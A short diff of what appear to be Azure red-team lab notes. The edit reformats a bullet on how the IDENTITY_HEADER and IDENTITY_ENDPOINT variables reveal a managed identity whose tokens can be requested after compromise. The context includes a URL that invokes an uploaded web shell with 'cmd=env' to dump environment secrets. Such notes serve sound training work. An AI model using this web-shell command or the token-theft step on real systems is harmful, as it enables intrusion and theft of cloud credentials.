@@ -153,8 +153,7 @@ to have interesting permissions on other Azure resources.
 
 •  After compromising an app service, we can request access tokens for the managed identity.
 
-•  If the app service contains environment variables IDENTITY_HEADER
-and IDENTITY_ENDPOINT, it has a managed identity.
+•  If the app service contains environment variables IDENTITY_HEADER and IDENTITY_ENDPOINT, it has a **managed identity**.
 
 ```
 http://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
